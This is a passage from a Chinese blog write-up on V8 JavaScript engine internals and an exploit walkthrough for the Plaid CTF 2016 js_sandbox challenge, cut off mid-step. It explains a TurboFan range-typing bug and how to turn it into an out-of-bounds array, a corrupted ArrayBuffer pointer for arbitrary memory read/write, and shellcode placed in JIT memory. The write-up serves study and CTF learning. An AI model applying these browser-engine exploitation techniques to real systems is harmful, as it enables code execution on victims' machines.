alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-133358.png" alt=""></li></ul></li><li>顺便说一下，种类的定义就是这样<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-133447.png" alt=""></li></ul><h3 id="JSObject"><a href="#JSObject" class="headerlink" title="JSObject"></a>JSObject</h3><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://v8project.blogspot.jp/2017/08/fast-properties.html" target="_blank" rel="noopener">https://v8project.blogspot.jp/2017/08/fast-properties.html</a></p><h4 id="JSObject-1"><a href="#JSObject-1" class="headerlink" title="JSObject"></a>JSObject</h4><ul><li>表示JavaScript对象的对象<ul><li>继承自Object，HeapObject，JSReceiver</li><li>对于想要了解element的properties和description的人，请参阅上面给出的参考链接<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-134206.png" alt=""></li></ul></li><li>properties<ul><li>It is called NamedProperties and manages elements accessed by name. The entity is FixedArray</li><li>Management when an object has a property (like a.x)</li></ul></li><li>element<ul><li>It is called IndexedProperties and manages elements accessed by index. The entity is FixedArray</li><li>Management when an object has an index (like a[0])<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-141036.png" alt=""></li></ul></li></ul><h3 id="JSFunction"><a href="#JSFunction" class="headerlink" title="JSFunction"></a>JSFunction</h3><ul><li><p>表示JavaScript function的对象</p><ul><li>继承Object, HeapObject, JSReceiver, JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-141352.png" alt=""></li></ul></li></ul></li><li><p>实际演示</p><ul><li>存放function f()在数组中</li><li>用0xdeadbee查找这个数组的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142310.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142325.png" alt=""></li><li><p>kCodeEntryOffset is a pointer to the JIT code (RWX area), many strategies to realize arbitrary code execution by writing shellcode before this</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142516.png" alt=""></p></li></ul></li></ul><h3 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h3><ul><li>Object holding a JavaScript array<ul><li>继承Object, HeapObject, JSReceiver, JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-143216.png" alt=""></li></ul></li></ul></li><li>实际演练<ul><li>由于0xdeadbee是Smi，因此可以通过在内存中搜索来查找存储在数组中的值。 基于此，查找数组的内存位置（因为有一些候选项，请小心）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-155446.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-155649.png" alt=""></li><li>如果增加数组的元素，它将自动扩大<ul><li>第三个和第四个元素被添加到只有两个元素的数组中<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-160146.png" alt=""></li></ul></li><li>当元素的数量增加时，它会扩展长度（FixedArray存放到另一个位置，并且kElementsOffset所保存的指针改变）</li><li>顺便说一下，有很多0x186e00404369代表TheHoleObject的地址（Oddball的kind = 2意思是void）<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-160210.png" alt=""></li></ul></li><li>注意<ul><li>在一个数组中，有时会存储一个double值的情况<ul><li>它是一个非Smi范围，但它被存储为一个double值而不是HeapNumber地址</li><li>Smi范围，但存储为double值而不是Smi表示</li></ul></li><li>Perhaps, it seems to be to decide the type of the entire array and speed up it<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-161601.png" alt=""></li></ul></li></ul><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个内存缓冲区</li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151829.png" alt=""></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef<br><strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong></li><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = [t32[1],t32[0]]<br><strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br><strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul></li></ul><h4 id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-162614.png" alt=""></li></ul></li></ul><h3 id="Numerical-conversion-tool-It-is-original-work"><a href="#Numerical-conversion-tool-It-is-original-work" class="headerlink" title="Numerical conversion tool (It is original work)"></a>Numerical conversion tool (It is original work)</h3><ul><li>在开始JavaScript利用之前<ul><li>频繁转换unsigned long long &lt;-&gt; double</li><li>预先制作转换工具很好</li><li>我制作了以下工具（我不会使用float，但只是为了确保）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-163249.png" alt=""></li></ul></li><li>源代码看起来像这样<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-163655.png" alt=""></li></ul><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><ul><li>Plaid CTF 2016 -Pwnables 666pts –js_sandbox<ul><li>下载链接<br><a href="https://goo.gl/Se5HTy" target="_blank" rel="noopener">https://goo.gl/Se5HTy</a></li><li>问题<br>Can you get a flag off of this site(<a href="http://js.pwning.xxx:27251/)?" target="_blank" rel="noopener">http://js.pwning.xxx:27251/)?</a><br>If so, I’ve got 666 points with your name on it!</li></ul></li></ul><h2 id="攻略方法-1"><a href="#攻略方法-1" class="headerlink" title="攻略方法"></a>攻略方法</h2><ul><li>模式1和2，策略如下</li></ul><ol><li>创建一个用于调试的js环境版本<br>如果有一个包含漏洞的patch，hit和build它。</li><li>分析patch以确定哪个patch适用于哪个进程<br> Full-Codegen, Crankshaft, TurboFan, Ignition, AST, IC, …<br> Full-Codegen and Crankshaft do not exist in V8 as of 2018 (see below)</li><li>编写利用漏洞的js代码段<br> Think JavaScript code that causes patched parts to pass and causes bugs</li><li>创建一个任意地址读/写的原语<br> 主要使用ArrayBuffer和TypedArray</li><li>getshell<br> 由于这是Pwn类别的问题，getshell是第一目标。<br> 在JIT区域嵌入shell代码经常被使用</li></ol><h2 id="初步调查"><a href="#初步调查" class="headerlink" title="初步调查"></a>初步调查</h2><ul><li>Plaid CTF 2016-Pwnable 666pts -js_sandbox<ul><li>访问<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-084413.png" alt=""></li></ul></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-084947.png" alt=""><br><a href="http://js.pwning.xxx:27251/files/problem.patch" target="_blank" rel="noopener">http://js.pwning.xxx:27251/files/problem.patch</a><br><a href="https://developers.google.com/v8/" target="_blank" rel="noopener">https://developers.google.com/v8/</a><br><a href="http://js.pwning.xxx:27251/file" target="_blank" rel="noopener">http://js.pwning.xxx:27251/file</a><br>提供了5个文件作为capture的必要文件。</p><ol><li>libc.so.6<br>当前的libc（ubuntu14.04)</li><li>natives_blob.bin<br>shell操作所需的文件</li><li>problem.patch<br>有漏洞的v8 patch</li><li>shell<br>构建samples/shell.cc用于本地测试</li><li>snapshot_blob.bin<br>shell操作所需的文件</li></ol><h2 id="shell文件"><a href="#shell文件" class="headerlink" title="shell文件"></a>shell文件</h2><p>shell (and *.blob)用作debug的目的<br>distribution file应该包含与problem服务器相同的源文件<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-091059.png" alt=""></p><ul><li>V8解释和执行的是JavaScript<ul><li>因此，exploit也只需要用JavaScript编写</li></ul></li><li>对于相同的输入，V8应该表现相同<ul><li>如果你可以通过shell来exp v8，你也可以通过Web服务器exp v8<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-092056.png" alt=""></li></ul></li></ul><h2 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h2><ol><li>启用PIE，FORTIFY_SOURCE，stack canary<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-092935.png" alt=""></li><li>PIE，FULL-RELRO启用<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-093123.png" alt=""></li><li>使read和load函数无效<br>print，read，load，quit和version等功能都是在sample/shell.cc中专门定义的，但是经过patch后，read和load时会失效<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-093555.png" alt=""></li><li>从源代码路径，TurboFan相关补丁和猜测<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-093840.png" alt=""><br>lhs：左手侧（左侧）rhs：右手侧（右侧）？<br>此外，因为函数名称是JSAddRanger，所以可以预料可能是与加法有关的漏洞（？）</li></ol><h2 id="Identification-of-calling-conditions"><a href="#Identification-of-calling-conditions" class="headerlink" title="Identification of calling conditions"></a>Identification of calling conditions</h2><ul><li>假设被patch的函数是有漏洞的<ul><li>我想调用这个函数<ul><li>如果我们不能调用这个函数，我们不能触发漏洞</li></ul></li><li>怎么调用它？<ul><li>我没有任何提示，我只有一个函数名称</li><li>猜测这个函数所在的文件或目录有什么功能</li><li>从该函数的调用回溯，找到调用路径。</li><li>最终目标是找到读取和调用每个函数的条件。</li></ul></li></ul></li></ul><h3 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h3><p>尝试google搜索函数名称<br>触及此功能的评论页尤为重要<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-101230.png" alt=""></p><h3 id="确认内置漏洞的文件名"><a href="#确认内置漏洞的文件名" class="headerlink" title="确认内置漏洞的文件名"></a>确认内置漏洞的文件名</h3><ul><li>src/compiler/typer.cc<ul><li>由于它是src/compiler/下的一个文件，因此它被认为与TurboFan有关<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-104240.png" alt=""></li></ul></li></ul><h3 id="确定来源"><a href="#确定来源" class="headerlink" title="确定来源"></a>确定来源</h3><ul><li>检查修补程序周围的代码<ul><li>看看JSAddRanger()<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-104616.png" alt=""></li></ul></li></ul><h3 id="确定调用路径"><a href="#确定调用路径" class="headerlink" title="确定调用路径"></a>确定调用路径</h3><ul><li>到目前为止，做一个总结<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-104852.png" alt=""></li><li>寻找调用路径<ul><li>使用gdb回溯调用栈是最快的方法。</li></ul></li><li><p>编写测试代码</p><ul><li>准备Javascript code去调用TurboFan<ul><li>通过代码调用函数10000次，由于我想调用TurboFan，所以不要忘记使用with语句<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-10-111002.png" alt=""></li></ul></li></ul></li><li><p>使用gdb运行</p><ul><li>如果某些条件不满足，JSAddRanger（）将不会调用…</li><li>In C ++ that does not reach JSAddRanger () in test code, that is, it does not reach the JSAddRanger () in the test code, you can not set a breakpoint unless you specify not only the function name but also the namespace and type to which it belongs. So using nm, it searches for mangled function names and specifies a breakpoint (if PIE is invalid, it is OK even if you set a breakpoint at the found address)</li><li>实际上，您无法在测试代码中访问JSAddRanger（）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-134138.png" alt=""></li></ul></li><li>调用JSAddRanger（）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-134445.png" alt=""><br>图示第一行是函数原型，第二行是函数定义，看看第三行。<ul><li>从JSAddTyper()调用。<ul><li>除非满足某些条件，否则不会调用JSAddRanger()<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-134751.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-134814.png" alt=""></li></ul></li></ul></li><li>同时检查JSAddTyper()的调用者<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-134854.png" alt=""><ul><li>在函数定义中只找到一个地方<ul><li>由于无法用简单的grep找到它，因此很有可能涉及宏。<ul><li>追溯更多来源是很麻烦的</li></ul></li></ul></li><li>在JSAddTyper()上放置一个断点并查看是否能在测试代码中断下来<ul><li>如果没有断下，努力尝试，阅读源码，进一步回溯</li></ul></li><li>使用gdb运行<ul><li>在JSAddTyper()上放置一个断点,发现停在断点处<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-135415.png" alt=""></li></ul></li></ul></li><li>在停止后进行回溯（查看调用栈）<ul><li>从这个函数名，可以确认JSAddRanger()和JSAddTyper()与优化编译器（TurboFan）相关<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-140004.png" alt=""></li><li>由于它是TyperPhase::Run，证明它是一个关于TurboFan优化中“Typer”阶段的函数。<br>另外，如果TurboFan进行了优化编译运行，就会发现JSAddTyper()在测试代码中被调用。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-140235.png" alt=""></li></ul></li><li>您可以在TyperPhase中看到TurboFan的功能<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-140844.png" alt=""></li><li>到目前为止做一个总结<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-141035.png" alt=""></li><li>JSAddRanger()调用条件探索<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-141136.png" alt=""><ul><li>lhs-&gt; IsRange（）&amp;&amp; rhs-&gt; IsRange（）</li><li>首先，代码中出现的Range是什么？<ul><li>为了知道这一点，我们需要更多地了解TurboFan的优化机制</li></ul></li></ul></li></ul><h3 id="Typer和Range调查"><a href="#Typer和Range调查" class="headerlink" title="Typer和Range调查"></a>Typer和Range调查</h3><ul><li>了解V8的优化（特别是Typer和Range相关）<ul><li>GitHub中有很多链接，从上往下依次阅读<ul><li><a href="https://github.com/v8/v8/wiki/TurboFan" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/TurboFan</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-143220.png" alt=""></li></ul></li></ul></li><li>和Typer有关的材料<ul><li>TurboFan概述<ul><li><a href="https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-143941.png" alt=""></li></ul></li><li>Typer收集类型信息并在其他地方完成优化<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-144124.png" alt=""></li></ul></li><li>TurboFan’s JIT Design<ul><li><a href="https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1sOEF4MlF7LeO7uq-uThJSulJlTh--wgLeaVibsbb3tc/edit#slide=id.p</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-144643.png" alt=""></li><li>当JavaScript代码中的变量或值不确定时，表示可以读取的范围的变量或值可以作为范围读取</li><li>据此，JSAddRanger()在添加带有范围信息的不定变量时,会派生出一个新的范围<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-151437.png" alt=""></li></ul></li><li>Fast arithmetic for dynamic languages<br><a href="https://docs.google.com/presentation/d/1wZVIqJMODGFYggueQySdiA3tUYuHNMcyp_PndgXsO1Y/edit#slide=id.p" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1wZVIqJMODGFYggueQySdiA3tUYuHNMcyp_PndgXsO1Y/edit#slide=id.p</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-151643.png" alt=""><br>虽然它没有直接解释范围，但根据该图，似乎在使用AND操作时变成范围（可能是“％”，这也在MOD操作中）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-152135.png" alt=""></li></ul><h3 id="确定调用条件"><a href="#确定调用条件" class="headerlink" title="确定调用条件"></a>确定调用条件</h3><ul><li>编写测试代码<ul><li>添加AND操作并在gdb下执行<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-152345.png" alt=""></li><li>在此之后，在断点处停止<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-152445.png" alt=""></li></ul></li><li>调用路径总结<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-152615.png" alt=""></li></ul><h2 id="漏洞理解"><a href="#漏洞理解" class="headerlink" title="漏洞理解"></a>漏洞理解</h2><ul><li>补丁周围的代码<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-153051.png" alt=""></li><li>从操作实例理解<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-153234.png" alt=""></li><li><p>用make x64.debug -j 8重新编译</p><ul><li>在“环境设置”描述的步骤中，我已经预先构建了它。</li></ul></li><li><p>尝试有趣的测试case</p><ul><li>下面的JavaScript代码展示了有趣的结果<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-153628.png" alt=""></li><li>如果打了有漏洞的补丁，你会在AND操作之后得到新的范围信息，<strong>而这个范围信息是错误的</strong></li><li><strong>但是，由于该信息仅用作类型提示，因此它不会对选择Word32的类型造成影响，因为它可以用32位表示[0,24]和[0,16]。在这个例子里，f函数正常应该返回24作为结果</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-154204.png" alt=""></li></ul></li></ul><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p><a href="https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea" target="_blank" rel="noopener">https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>通过假的range信息，你能做什么？<ul><li>这里的目标是创建任意地址读/写的原语</li><li>具体来说，就是伪造一个很大的array的length<ul><li>许多JavaScript引擎的漏洞利用都是使用这种方法。</li></ul></li><li>OOB-RW (Out-Of-Bounds-Read/Write access)</li><li>如果在array之外读写数据，并劫持JSArrayBuffer的BackingStore的指针，就获胜。</li></ul></li><li>如何用OOB-RW创建任意地址读/写的原语<ul><li>内存排布如下<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-155748.png" alt=""></li><li>如果可以模拟长度，就可以通过越界访问来更改JSArrayBuffer的BackingStore的指针<br><strong>基本形式如下</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-160205.png" alt=""></li></ul></li><li>通过range来实现我们的目的（改大array的length）<ul><li>正确的尝试<ul><li>首先用范围信息创建一个值</li><li>使用这个值来创建一个array</li></ul></li><li>测试代码看起来像这样<ul><li>变量sz具有范围信息<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-160615.png" alt=""></li></ul></li><li>修改源代码为有漏洞的版本<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-161055.png" alt=""></li><li>make x64.debug -j 8再次编译</li></ul></li><li>在gdb下运行，检查内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-161251.png" alt=""><ul><li>搜索0xdeadbee将命中3次，其中这个是一个数组（= FixedArray）</li><li>通过将标记值1加到FixedArray的地址上，然后进行搜索</li><li>找到的地址应该是JSArray<br><strong>一个很重要的图</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-163558.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-163924.png" alt=""><br>通过check我知道我能伪造FixedArray的长度，因为如果不打patch，上下的值应该都是0x18<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-164259.png" alt=""></li></ul></li><li>这意味着什么？<ul><li>我们打算创建一个长度0x18元素的数组，但实际上只准备了长度0x10元素的数组<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-165817.png" alt=""><br><strong>虽然它与基本形式稍有不同，但如果您仅信任此长度（0x18)，并将这个长度的值写入FixedArray，则您能够读取和写入的数据，将会超出原本仅有0x10的FixedArray</strong><br>实际上想用只有0x8个字节的数据来覆盖backing store ptr是十分困难的，我们将在后面介绍更好的方法。</li></ul></li></ul><h2 id="参考解说：typed-lowering"><a href="#参考解说：typed-lowering" class="headerlink" title="参考解说：typed-lowering"></a>参考解说：typed-lowering</h2><ul><li>为什么会出现这种情况？<ul><li>使用range信息的部分在哪里？<ul><li>在typer phase旁边的typed-lowering phase<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-170659.png" alt=""></li></ul></li></ul></li><li><p>typed-lowering</p><ul><li>它似乎使用type information来optimize graph</li><li>Follow until array association comes out<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-171104.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-171205.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-171313.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-171354.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-171702.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-171753.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-172100.png" alt=""></li></ul></li><li><p>用printf调试确认<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-172253.png" alt=""></p></li></ul><h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><ul><li>你现在在做什么？<ul><li>Array length伪造</li></ul></li><li>我们将会考虑编写exp<ul><li>流程如下<ol><li>伪造Array length</li><li>伪造ArrayBuffer</li><li>Identify function object</li><li>在JIT区域嵌入shellcode</li></ol></li></ul></li></ul><h3 id="伪造Array-length"><a href="#伪造Array-length" class="headerlink" title="伪造Array length"></a>伪造Array length</h3><ol><li>顺次排列两个FixedArray（其长度通过range漏洞伪造）<br>由于这些FixedArrays的范围是伪造的，因此它们可以在数组之外进行读写操作.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-173202.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-173214.png" alt=""></li><li>每个double值存储在Element [0]中，并且数组类型被识别为double类型（即FixedArray被转换为FixedDoubleArray）<ul><li>在FixedArray变成FixedDoubleArrayed之后，内存的布局会发生变化并且变的很麻烦，所以让我们先提前认识它是一个只有double类型元素的FixedDoubleArray。<br>这也确保了FixedDoubleArray 1和2连接<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-173539.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-173723.png" alt=""></li></ul></li><li>使用OOB-W漏洞更新FixedDoubleArray1中的FixedDoubleArray 2的kLengthOffset<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-173919.png" alt=""><br>如果连续排列，FixedDoubleArray 1的元素[17]应该是kLengthOffset。<br>通过此更新，FixedDoubleArray 2可以越界读取和写入了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-174210.png" alt=""><br>其实我们不能直接访问Element [17]。</li></ol><ul><li>状态<br>在JSArray中，长度信息首先存储在两个地方。JSArray::kLengthOffset(= 24)和FixedArray::kLengthOffset(=16)</li><li>原因<br>当存储到一个数组时，它使用JSArray::kLengthOffset和FixedArray::kLengthOffset来进行索引的范围判断（可以确认的是，如果你通过gdb上的rwatch设置了一个内存访问断点，它将以任一方式停止）<br>17超出了FixedArray::kLengthOffset的范围，所以我们扩展了数组的长度并在其他地方预留了一个新数组。这不会成为OOB-RW。</li><li>解决方法<br>According to Write-up, it seems to be enough to substitute twice in the for statement as follows<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;24;i+=17)</span><br><span class="line">    Element[i]=value;</span><br></pre></td></tr></table></figure></li></ul><p>称为KeyedStore IC的IC对应于数组元素中的存储，KeyedStoreIC是状态直接转换为(0)-&gt;(1)的IC，IC在第二次访问时已处于活动状态.<br>当通过触发IC来处理时,它不会与JSArray::kLengthOffset或FixedArray::kLengthOffset进行比较（However, this is not exactly confirmed here, and only JSArray :: kLengthOffset comparison may be done on the code embedded in JIT）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-184255.png" alt=""></p><h3 id="伪造ArrayBuffer"><a href="#伪造ArrayBuffer" class="headerlink" title="伪造ArrayBuffer"></a>伪造ArrayBuffer</h3><ol><li>将ArrayBuffer放置在FixedDoubleArray 1，2之后<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-184358.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-184411.png" alt=""></li><li><p>由FixedDoubleArray 2的漏洞搜索kByteLengthOffset和kBackingStoreOffset的偏移量</p><ul><li>它每次从FixedArray2的元素[16]中读取一个元素，并根据是否包含假定值进行搜索。 您可以在kByteLengthOffset（= ArrayBuffer拥有的BackingStore的长度）中放入一个特征值并搜索它（如果向此添加1，kBackingStoreOffset的偏移量也是已知的）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-11-184618.png" alt=""></li><li>ab_off表示从FixedArray 2（代码中的arr [1]）中看到的作为kByteLengthOffset位置的元素索引，</li></ul></li><li><p>更新来kByteLengthOffset和kBackingStoreOffset的偏移量</p><ul><li>如果设置元素[kByteLengthOffset_offset] = 0xfffff0，<br>元素[kByteLengthOffset_offset + 1] = rw_addr。<br>请记住在步骤2-2中获得的偏移量，并且在ArrayBuffer读取和写入rw_addr，也就是说，它几乎变成了任何内存读/写的原语。<br><img 